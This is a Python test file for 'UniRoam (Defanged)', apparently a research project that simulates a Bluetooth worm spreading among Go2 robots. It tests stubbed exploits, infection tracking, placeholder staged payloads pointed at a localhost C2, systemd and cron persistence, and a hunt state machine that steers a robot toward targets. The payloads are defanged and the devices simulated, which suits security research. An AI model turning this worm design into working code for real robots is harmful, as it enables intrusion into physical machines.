"""
Test suite for UniRoam (Defanged).

Tests the propagation logic, persistence patterns, payload builder,
infection tracking, hunt state machine, and virtual simulator against
the stub/simulated environment.
"""

import asyncio
import unittest
from unittest.mock import patch

from uniroam import config
from uniroam.exploit_stub import (
    ExploitStub, SimulatedDevice, scan_for_robots, exploit_robot,
)
from uniroam.propagation_engine import InfectionTracker, NetworkScanner, WormPropagator
from uniroam.persistence import (
    PersistenceManager, systemd_service_content, install_systemd,
    install_cron, CRON_CONTENT,
)
from uniroam.payload_builder import (
    PayloadManager, build_stage0, build_stage1, build_stage2,
)
from uniroam.opsec_utils import dead_mans_switch
from uniroam.hunt_state_machine import (
    HuntStateMachine, HuntState, SearchPattern, BearingSweep,
    RSSI_DETECTION, RSSI_IN_RANGE,
)


class TestExploitStub(unittest.TestCase):
    """Test that the exploit stub interface works without BLE hardware."""

    def test_scan_returns_empty(self):
        devices = asyncio.run(scan_for_robots(timeout=1.0))
        self.assertEqual(devices, [])

    def test_exploit_chain_succeeds(self):
        device = SimulatedDevice(name="Go2_TEST", address="AA:BB:CC:DD:EE:01")
        success, serial = asyncio.run(exploit_robot(device, "echo test"))
        self.assertTrue(success)
        self.assertIsNotNone(serial)
        self.assertIn("TEST", serial)

    def test_stub_connect_disconnect(self):
        device = SimulatedDevice(name="Go2_SIM", address="AA:BB:CC:DD:EE:02")
        stub = ExploitStub(device)

        async def _run():
            self.assertTrue(await stub.connect())
            self.assertTrue(await stub.handshake())
            serial = await stub.get_serial()
            self.assertIsNotNone(serial)
            self.assertTrue(await stub.inject_command("id"))
            await stub.disconnect()

        asyncio.run(_run())


class TestInfectionTracker(unittest.TestCase):
    """Test infection tracking, deduplication, and rate limiting."""

    def setUp(self):
        self.tracker = InfectionTracker()
        self.tracker.infected.clear()
        self.tracker.failed.clear()
        self.tracker.infection_times.clear()

    def test_mark_infected(self):
        self.tracker.mark_infected("AA:BB:CC:DD:EE:01", "SN001")
        self.assertTrue(self.tracker.is_infected("AA:BB:CC:DD:EE:01"))

    def test_not_infected(self):
        self.assertFalse(self.tracker.is_infected("AA:BB:CC:DD:EE:99"))

    def test_blacklist_after_failures(self):
        addr = "AA:BB:CC:DD:EE:03"
        for _ in range(3):
            self.tracker.mark_failed(addr)
        self.assertTrue(self.tracker.is_blacklisted(addr))

    def test_not_blacklisted_under_threshold(self):
        addr = "AA:BB:CC:DD:EE:04"
        self.tracker.mark_failed(addr)
        self.tracker.mark_failed(addr)
        self.assertFalse(self.tracker.is_blacklisted(addr))

    def test_rate_limiting(self):
        from datetime import datetime
        for _ in range(config.PROPAGATION_RATE_LIMIT):
            self.tracker.infection_times.append(datetime.now())
        self.assertTrue(self.tracker.should_rate_limit())

    def test_infection_clears_failures(self):
        addr = "AA:BB:CC:DD:EE:05"
        self.tracker.mark_failed(addr)
        self.tracker.mark_failed(addr)
        self.tracker.mark_infected(addr)
        self.assertFalse(self.tracker.is_blacklisted(addr))


class TestPayloadBuilder(unittest.TestCase):
    """Test payload generation (stub placeholders)."""

    def test_stage0_contains_c2_url(self):
        s0 = build_stage0("http://localhost:8443")
        self.assertIn("localhost:8443", s0)
        self.assertIn("DEFANGED", s0)

    def test_stage1_placeholder(self):
        s1 = build_stage1("http://localhost:8443")
        self.assertIn("DEFANGED", s1)
        self.assertIn("memfd", s1.lower())

    def test_stage2_placeholder(self):
        s2 = build_stage2("http://localhost:8443")
        self.assertIn("DEFANGED", s2)

    def test_payload_manager(self):
        pm = PayloadManager("http://localhost:8443")
        self.assertIn("DEFANGED", pm.stage0())
        self.assertIn("DEFANGED", pm.stage1())
        self.assertIn("DEFANGED", pm.stage2())

    def test_parent_id_embedding(self):
        s0 = build_stage0(parent_id="GO2_patient_zero_abc123")
        self.assertIn("GO2_patient_zero_abc123", s0)


class TestPersistence(unittest.TestCase):
    """Test persistence mechanism documentation and sim-root mode."""

    def test_systemd_service_content(self):
        content = systemd_service_content()
        self.assertIn("[Unit]", content)
        self.assertIn("[Service]", content)
        self.assertIn("Restart=always", content)
        self.assertIn(config.WORM_INSTALL_PATH, content)

    def test_cron_content(self):
        self.assertIn("*/15", CRON_CONTENT)
        self.assertIn("root", CRON_CONTENT)

    def test_persistence_manager_install(self):
        pm = PersistenceManager()
        results = pm.install_all()
        self.assertTrue(results["systemd"])
        self.assertTrue(results["cron"])
        self.assertTrue(results["rc_local"])
        self.assertTrue(results["watchdog"])

    def test_persistence_manager_remove(self):
        pm = PersistenceManager()
        results = pm.remove_all()
        self.assertTrue(results["removed"])


class TestDeadMansSwitch(unittest.TestCase):
    """Test the auto-cleanup timer."""

    def test_not_triggered_when_recent(self):
        import time
        self.assertFalse(dead_mans_switch(time.time(), max_hours=48.0))

    def test_triggered_when_stale(self):
        import time
        old = time.time() - (49 * 3600)
        self.assertTrue(dead_mans_switch(old, max_hours=48.0))

    def test_boundary(self):
        import time
        exactly_48h = time.time() - (48 * 3600) - 1
        self.assertTrue(dead_mans_switch(exactly_48h, max_hours=48.0))


class TestHuntStateMachine(unittest.TestCase):
    """Test the autonomous hunt state machine."""

    def test_initial_state(self):
        hsm = HuntStateMachine()
        self.assertEqual(hsm.state, HuntState.IDLE)

    def test_start_hunt(self):
        hsm = HuntStateMachine()
        hsm.start_hunt()
        self.assertEqual(hsm.state, HuntState.SEARCHING)

    def test_search_returns_move_command(self):
        hsm = HuntStateMachine()
        hsm.start_hunt()
        cmd = hsm.tick()
        self.assertIsNotNone(cmd)
        self.assertEqual(cmd["action"], "move")
        self.assertIn("distance_m", cmd)
        self.assertIn("heading_deg", cmd)

    def test_detection_triggers_bearing(self):
        hsm = HuntStateMachine()
        hsm.start_hunt()
        hsm.on_ble_scan_result("AA:BB:CC:DD:EE:01", "Go2_Target", RSSI_DETECTION + 5)
        self.assertEqual(hsm.state, HuntState.DETECTED)
        cmd = hsm.tick()
        self.assertEqual(hsm.state, HuntState.BEARING)
        self.assertEqual(cmd["action"], "rotate")

    def test_in_range_triggers_exploit(self):
        hsm = HuntStateMachine()
        hsm.start_hunt()
        hsm.on_ble_scan_result("AA:BB:CC:DD:EE:01", "Go2_Target", RSSI_DETECTION + 5)
        hsm.tick()  # -> BEARING
        # Simulate full bearing sweep
        for _ in range(hsm.bearing.steps):
            hsm.on_ble_scan_result("AA:BB:CC:DD:EE:01", "Go2_Target", -65)
            hsm.tick()
        # Should be APPROACHING now
        self.assertEqual(hsm.state, HuntState.APPROACHING)
        # Simulate getting close
        hsm.on_ble_scan_result("AA:BB:CC:DD:EE:01", "Go2_Target", RSSI_IN_RANGE)
        self.assertEqual(hsm.state, HuntState.IN_RANGE)
        cmd = hsm.tick()
        self.assertEqual(cmd["action"], "exploit")

    def test_reset(self):
        hsm = HuntStateMachine()
        hsm.start_hunt()
        hsm.reset()
        self.assertEqual(hsm.state, HuntState.IDLE)


class TestSearchPattern(unittest.TestCase):
    """Test the expanding square spiral."""

    def test_expanding_legs(self):
        sp = SearchPattern(step_base_m=3.0, step_inc_m=3.0)
        waypoints = [sp.next_waypoint() for _ in range(8)]
        # First waypoints should have small distances
        self.assertGreater(waypoints[0][0], 0)
        # Headings should cycle through 0, 90, 180, 270
        headings = [w[1] for w in waypoints]
        self.assertIn(0, headings)
        self.assertIn(90, headings)


class TestVirtualBLE(unittest.TestCase):
    """Test the virtual BLE bus."""

    def test_scan_finds_registered_devices(self):
        from simulator.virtual_ble import VirtualBLEBus, VirtualBLEDevice

        async def _run():
            bus = VirtualBLEBus()
            d1 = VirtualBLEDevice("Go2_A", "AA:00", position=(0, 0))
            d2 = VirtualBLEDevice("Go2_B", "BB:00", position=(5, 0))
            await bus.register(d1)
            await bus.register(d2)

            visible = await bus.scan("AA:00", timeout=0.1)
            self.assertEqual(len(visible), 1)
            self.assertEqual(visible[0].name, "Go2_B")

        asyncio.run(_run())

    def test_out_of_range_not_visible(self):
        from simulator.virtual_ble import VirtualBLEBus, VirtualBLEDevice

        async def _run():
            bus = VirtualBLEBus()
            d1 = VirtualBLEDevice("Go2_A", "AA:00", position=(0, 0))
            d2 = VirtualBLEDevice("Go2_B", "BB:00", position=(100, 0))
            await bus.register(d1)
            await bus.register(d2)

            visible = await bus.scan("AA:00", timeout=0.1, max_range_m=30.0)
            self.assertEqual(len(visible), 0)

        asyncio.run(_run())

    def test_infection_tracking(self):
        from simulator.virtual_ble import VirtualBLEBus, VirtualBLEDevice

        async def _run():
            bus = VirtualBLEBus()
            d1 = VirtualBLEDevice("Go2_A", "AA:00")
            await bus.register(d1)
            self.assertEqual(bus.get_infection_count(), 0)
            await bus.mark_infected("AA:00")
            self.assertEqual(bus.get_infection_count(), 1)

        asyncio.run(_run())


if __name__ == "__main__":
    unittest.main()
